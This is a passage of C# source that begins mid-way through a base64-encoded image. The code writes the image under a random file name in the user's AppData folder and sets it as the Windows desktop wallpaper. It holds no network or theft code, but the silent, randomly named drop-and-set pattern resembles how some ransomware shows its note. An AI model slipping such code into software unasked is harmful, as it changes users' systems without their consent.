5c6PUBj+nIKpfo9wGrJlddrt2GlJwAADipJREFUKcKeqdl8rlgJH0rSdrk5jU9fjc7UjTd2NFrWfYzOZl/gBd7moKRat2f4d276HFfccs7nufSR6s9rIWZ5jmC54NNhdhNOZFqDm+V2jg1/nRhKUtG2bCn6BiqPstqSkn65Ej4XEtkuJFL2Yvoy9waPviVe4ojuyrm42CxUbvXRpVgH1IpzTFXIm0FsbGGn4r/7NrdWOqjonvtYhqUGdzfLJpXMSi4bFHP5SlVbbwle1zr4eLq8jZNCF1NONjpVKr8Ae4eGVTlO5OZadVJWeTmKbYMrkeeau/GW5EOrfIxPi4Nl+gXf3JXSHlBV2jWDE6zKcW5Reisfh9Yv1RCuZQLD2b141f115lGHBM9AJd5g5YZ33VblvzhmUdmEZLPwqpeYyo61kl2Gx0OcD3NC0Zn7tbSxR9GJcPn4YlVIe1CS7VLJ5XT+mFr7XsXW2IVVq/w+l7iVnYK8XjlOCt6bKkdN5cJ+qVuveURrqc2L3U2Jh6s8azc+ylMRR1aV7akwFT88GefXPPZsIpc/1anGK6pinhIk+48wMegbrBHGG4t+VCZvVgpyalzibwkfyw5OTOX/v5DILHaplfhTIZ1dU9128P2Gr8zv6hT1Tu4OMmXl+FDwSlU5pqbBZwvrBKmiXLcV4Wkt/pfVil58j++JssvVtbY235l/1drPY9fkVTweR9W62XXYsVaHfEEadLWwefGvg0Oxm+8BGs8jVtgmjABr0sJBxZfu8eT5swurh0oYy1rFbRJKnNqddNtS9Kf/zzBbhkHBW/rE9MZFWafcsW9QbMPl43thkFD9jnRh3eR3uvo4P/mgjsdsNq3VvG+q2h6glEY+ZVYLTuc7+TDbJGd+lwXrjUwmk8lkMu8xNuKy3jPuySxZemGz50wmk8lkMgvBsmxBfx7hDfbisWC0m8lkMplMJpPpGZXta0scw7LcXGujz0wmk8lkMplMs8S928dzHz95rzhPymQymUwmk1lqWZtJSca6eKE2Ws1kMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZzH8QrQzk3Ko9wramz5Iu2+JgvbRreOW4LvzbN21MOYPdmtv47DdVu7M1s31yJpPJZDKZf1va2Ddt+zqf5dg/yArbL+niLT6+l3ZT7uAPIfwL4favZURzqcW9us/OAlYms3SQ9yLMZDJLjDU5l6FgMpN5lF+DF3lgyRVscTOBdxhWFf4kE1kNPMG85lK7g9N6s3SZTKYXyAJWJpNZMrSyBSukn5PB83x+iZXo3aNvneW/hziYDZnNzcxpLrU8ZZXJLIVkASuTySwZOnmc9tQNTV7CxXlXaaBcdS/3vnsFyWQyi4u8rWQms1jYkGeZRzvzGFPcZawvP2U2M9JxMbgshDTPfkxJGc3gETYI/y7HNcxKyb7J1xnJfSnkXynmSrzO26EMM9PHfhXuYw4zmMN3myjVXbxDO/N5u1gknEI7T4VB3m60M5aNijEHcyHvhFK9zQtsCs5N6c/ipmIlH8KrLGABc/hNsb9bl4eZmdJ8hb1Zm6dCDUxgzxR/KPNDGf4C1uRpZnBvdwrpZzGVdqZzGG/XivPHVMPl46Kwhrgq96Tm9DT4ERvWz24QY1IDm8kCTg7/fp7ptDOHQ9iXLzcsfCaTyWQyS57+/JwSs9kcbMoCSpwW5IkWTg+6ybczhRnMTyFvN7H0szkl3mJtsC2d6fJdwie/Hzel8LncxTRm0BFyrxTsXyGRsbSF7A5jQXdLeH05OKlv/w8YwkuUeKlqL9vR4X7/3jDZ04Px3VQ+Ef5ahhf5I0NSyKrcRinMih2Zrt0xXLgaj6bwGRyYwl9KgVP4WLG0lTLcyUrMTU+2xK61it3CVryY2gPaOI/HmFpLyX2f0CSuYHi6ndfpZFuwCe28xs7pql3qKLmfwfzifFifpBH/bAr5JSWurlX4TCaTyWSWIn6ePnVnBqmlYkt/dPA+cET4Lr7DoeD3Sb6Zw/ENM+rLm+kjfSB96MvMlOADDAyRLw15vcw24JkUMomPhMiPh8hbhvAjuLC72z8g2ce9FL70R6XU7mFkiPyBIGDd3V3KZ4dS/ZwBKXwlfp/uCG3cmKJ9Ms1arcjdKXCTkObVtQSsO+sIWOswIf31EPeAn9PBPDarVeZR3JUu+UwKXJWHUmAXAWujWgLWL5Kwu3cSmofxArukq2oKWKtzRZJxK2zCOEpcxegUeGGxDJlMplfIS4SZTG+yKl9J5+UlIbSmZR38LMziRD9P93A5GE9HumpUw7xKPJ5ibk0HKwaZZmRx0aryqi/gKv4BJqTA/smUr8xRTEnnl6aToezKTxsWaTjHpvtqD0Zwldvfho83TKEBJ4R5l8+wPmhhMyanO8Im7JXOX6YTzOXlFHhzSLOmq616/rdaQjVuw1Hgx5zOyWGlNbI9HwQd3JICX+F65teKX1Mrtjwztx6/5zuszdscyaQ6hZzHB/g+D/Kd4r/90smBXM9B9OfUPIOVySwGsoCVyfQmn0snHcxK5yXeSOeD2aPWhVPTSfzEdjbMq4MjOYx9+DVXcFFQ7ql3bWcoWEWSKBXjP8b56XzDNIuzHXOZ3rBIW4V5kTdDeOX2+7FTLfcEzTCbg9L5chzCQEp8lT+GaN9MJx3hpuYHtbaV2WKhChCZzjNgEqfWlzv3SSftxcXWScxtOq8r0kl/Tuf3/JA7UwG6MJW9uIK9avm5eJbX0/lGXMLV9OOapguTyWSaJAtYmUxvslI6KRWdGMU3bb1aFzbjs7uaiVzOZvyF2fx3c4bB3ea1gFuYmH6eB/bg7jCzVZPhYV1yVgiPt79CWN3rKY9zfzo/GnyKWUVJYuV00pnmAsvEu15jYQtQYXYTcVqCHnqp+FdrT574vXwt/NySb3FVaGyRY7mGTRjFqSxT/HcmhwQpuT8f5y6OaLowmUymSbKAlcn0Js18NRdOlqrJijzDySzgBMb3nueVh7g+na/MTxjFI1WCQjXd3l3LotXAkelkMGdwBFfUF6QalOHdobJiO2ARett2zuYQ3kkhfTmAg2tFfoVvgFb24utVphITWYG/hpA1uGhhy5bJZOqRBaxMpje5KpzHt6si93RwTi/lNZCHWJ9Wbm5uTqV5ypZl5UmsNr7Nc4zt7qrHeD6dR02myu13cnNYMVwI3uCGdH4sK3NtMcIl4bwlnFTKM58/Ncyit/ZALPFE+Ll7OO/RDNZg2riSITyYHnQLu4fpugp3cF66wVZOYqfwbxuDWcCeDGVyUhPsmzw19GU5VqozPZbJZJonC1iZTG9yd9KM6cvK4QWrmJjdkD5pirNBpYaBNdkpLHUtx3xWDqLMgKIa9ULkdS/3JTWmp7iyYWHKTOCudMnaQVLZPJ28wMMhfmed8wZM58wkZHTw1aoIl/IKaGNUkmOGslaKEPWlFqSTllR161e57IrUrLoGXBayOCqtn45kJwalfOMMU80n8lWOS+fb86V0PjW5eo9V10p/9k1GjvhDcC22IWcmpx6zWIPb0l8v0Je9GM9rvMZ2zd1jJpPJZDLvBhvyMCUeTdMAy/AsJe5jxRDzK8G6/qYUeFFyTzWfHzbMaJ1w+TTO4Le8lULa+Rkbp8h/SOGVZFtSOUvMYr9aWWzMHNo5q+nbX57LKTEzGAxenxxPfKoY+YPJp0OJF5rOYlmuo8SYWv+28onky6oyU7Uzb1DiN8XIx6TcF3Ar3+FlpqfAmXw0RF6NKcGtQzOaZAO5IDym8zmRK3iFOSGXk1kH7Bgi35EEsu+zgG+nn2skvx57p1yODFdVFnZX4OUU+CSrg/V4ib8HB6pnUUpS74j0pMrHW03cYCaTyWQy7x7rcTIlnklzWiVODpMofTgufMjLx+XpqsrxDqcU3Vl14aIQ+Rh24gsh5CjWZARnBN+h5WRP55JiXhP5TC0VrivpZM2e3P4y7MtU3uFu/kmJX/NfIc4R3MMrxTLczXXBo1UDDqQUpIQutLIVlyWh9h4m8TrHVCkkjeDoUIC5fIGxIeRFPk0fBhXdg5V4JCiENWAU3wjiVImvhwd9C/uxHytxWnJJWjkeZmNO5jK+yW3czWvMZbc0B3YC7xSvKtsBfKsY+BxHsA7XcySXhEdzZjK8aGP/4Ept9zp3lMlkmuFd0/XMZP6z6Mcqwe3QfF4Na3YtLMeI4pJQeeuSYSGwhVlMqr98NiRNkpUYn/KtrBs+B/qwIoOLyb5D31C8cuAUplUtfu3HV9mh2fv+/6zGwNTFdDKJmeHfZVkmfcgrtNLB60Gbux4bcS77NtzBcBjLJZGxLFa+Xqsm+wTXEnOZyKpBqG1hMtNpYd3i5S1M7c6sskwbK6fabucVBrA8rbwVPHSsUnxMaOVl+idfpqvSRol5vJTirMTQqqvGsnzyUxpLO50RTEn1X66ZV4ICXxsrJTH0uSZuLZPJZDKZzMIwpje8RvU6J/ONomepTCaTWarISu6ZTOb/08afKPE8a3IwY3l0SZeqlePSdNd+rMoG3Br0xzOZTCaTyWSWXlZPcswbHMfLdbbYe5cZwj9SwX7Ljzin9zx+ZTKZTCaTySx2fhs0o0/vPadQi8hnQ6nuSY4GMplMZqklK7lnMpkCQ9kRzOWB4oY/S5BWPsgAOnk2qHhnMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQymUwmk8lkMplMJpPJZDKZTCaTyWQy/0b8P5xGJJiDZB8cAAAAAElFTkSuQmCC"; // Пример base64-кода изображения

            string fileName = GenerateRandomFilename1() + ".bmp";
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string fullFilePath = Path.Combine(appDataPath, fileName);

            try
            {
                // Decode base64 image and save it as a file
                byte[] imageBytes = Convert.FromBase64String(base64Image);
                File.WriteAllBytes(fullFilePath, imageBytes);

                // Set the wallpaper
                SetWallpaper(fullFilePath);

                Console.WriteLine("Wallpaper changed successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        public static void SetWallpaper(string pngFilePath)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pngFilePath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        public static string GenerateRandomFilename1()
        {
            Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder name = new StringBuilder();

            for (int i = 0; i < 10; i++) // Generate 10 characters for the filename
            {
                name.Append(chars[random.Next(chars.Length)]);
            }

            return name.ToString();
        }
    }
    

  
    }
